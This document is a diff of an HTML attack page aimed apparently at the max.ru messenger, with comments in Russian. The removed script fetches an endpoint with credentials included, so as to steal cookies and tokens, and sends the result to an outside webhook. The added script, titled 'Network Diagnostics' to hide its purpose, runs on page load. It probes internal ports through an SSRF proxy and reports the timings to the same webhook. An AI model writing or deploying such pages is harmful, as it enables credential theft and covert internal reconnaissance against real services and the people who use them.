@@ -2,17 +2,46 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка...</title>
+    <title>Network Diagnostics</title>
 </head>
 <body>
+    <h1>Проверка конфигурации сети...</h1>
+    <div id="log"></div>
+
     <script>
-      fetch('https://platform-api.max.ru/some-endpoint', {
-    method: 'GET',
-    credentials: 'include' // Пытаемся забрать куки/токены
-}).then(r => r.text()).then(data => {
-    fetch('https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4?cors_leak=' + btoa(data));
-});
+        const webhook = "https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4";
+        const internalPorts = [22, 80, 443, 3306, 6379, 8080, 9090];
+        const targetIp = "127.0.0.1.nip.io";
+
+        async function scanPorts() {
+            for (let port of internalPorts) {
+                const start = Date.now();
+                
+                try {
+                    // Мы заставляем БРАУЗЕР отправить запрос на их сервер,
+                    // который в свою очередь должен дернуть сам себя (SSRF)
+                    // ВАЖНО: Тут должен быть эндпоинт мессенджера, который делает запрос.
+                    // Например, если это превью, мы просто имитируем обращение к нему.
+                    
+                    const response = await fetch(`https://max.ru/proxy?url=http://${targetIp}:${port}`, {
+                        mode: 'no-cors'
+                    });
+                    
+                } catch (e) {
+                    // Ошибка — это тоже результат
+                }
+
+                const duration = Date.now() - start;
+                
+                // Отправляем результат замера на твой бин
+                fetch(`${webhook}?port=${port}&time=${duration}&status=scanned`);
+                
+                document.getElementById('log').innerHTML += `<p>Port ${port}: ${duration}ms</p>`;
+            }
+        }
+
+        // Запускаем сканирование
+        scanPorts();
     </script>
-    <h2>Документ загружается...</h2>
 </body>
 </html>
